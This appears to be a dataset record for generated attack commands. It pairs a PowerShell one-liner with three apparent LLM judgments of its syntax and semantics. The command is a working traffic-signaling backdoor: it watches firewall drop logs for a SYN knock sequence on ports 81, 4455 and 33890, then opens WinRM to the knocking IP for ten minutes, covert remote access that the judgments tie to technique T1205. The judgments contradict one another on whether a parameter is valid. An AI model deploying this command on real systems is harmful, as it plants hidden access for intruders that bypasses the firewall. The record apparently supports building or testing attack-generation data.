command: Invoke-Command -ComputerName localhost -ScriptBlock { $log = "$env:SystemRoot\System32\LogFiles\Firewall\pfirewall.log"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; $seq=0; $lastIP=$null; $timeout=[TimeSpan]::FromSeconds(30); $t0=Get-Date; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match 'DROP\s+TCP\s+(\d{1,3}(?:\.\d{1,3}){3})\s+\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+(81|4455|33890)\b.*\btcpsyn\s+1\b') { $src=$matches[1]; $dstp=[int]$matches[2]; $now=Get-Date; if (($src -ne $lastIP) -or ($now - $t0 -gt $timeout)) { $seq=0; } $expected=@(81,4455,33890)[$seq]; if ($dstp -eq $expected) { $seq++; $lastIP=$src; $t0=$now; } else { $seq=0; $lastIP=$src; $t0=$now; } if ($seq -ge 3) { $name="winrm-synseq-$($src.Replace('.','-'))"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5985 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 600; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } $seq=0; } } } }
explanation: Uses a TCP SYN knock sequence (81→4455→33890) on closed ports to open WinRM (5985) for the knocking IP for 10 minutes.
rationale_steps: Track ordered TCP SYNs to specific ports per source IP with a timeout
Unlock WinRM when the sequence is correct

llm_judgments.syntactic_justification: Well-formed PowerShell with balanced quoting/braces and proper pipelines, but includes an invalid Set-NetFirewallProfile parameter (-LogDropped) that would cause a parameter-binding error.
llm_judgments.semantic_justification: The logic correctly performs a TCP SYN knock sequence to trigger a temporary firewall rule for WinRM (consistent with T1205), but it will likely fail as written due to the invalid parameter, requires administrative privileges, and assumes remoting (WinRM) is enabled on localhost.

llm_judgments.syntactic_justification: The command is largely well-formed PowerShell with balanced braces, valid regex patterns, and proper cmdlet usage, though the escaped backslashes in the regex (e.g., 'DROP\s+TCP') may behave differently than intended inside a double-quoted here-string context versus a single-quoted -match pattern, and the nested ScriptBlock with Start-Job param block is syntactically valid but complex enough to risk edge-case parsing issues.
llm_judgments.semantic_justification: The command accurately implements a TCP SYN port-knocking sequence (81→4455→33890) by monitoring Windows Firewall DROP logs for SYN packets, tracking per-source sequence state with timeout resets, and dynamically creating a timed (10-minute) inbound WinRM firewall rule for the knocking IP — precisely matching T1205 Traffic Signaling used to trigger covert access to a C2 channel.

llm_judgments.syntactic_justification: The command is a well-formed PowerShell script block using valid cmdlets, proper variable interpolation, balanced braces, and correct regex escaping for the -match operator.
llm_judgments.semantic_justification: The script perfectly implements a port-knocking (traffic signaling) mechanism by monitoring firewall logs for a specific TCP SYN sequence to dynamically modify firewall rules; however, it incorrectly claims to require no privileges when it actually requires Administrator rights to modify firewall profiles and rules.
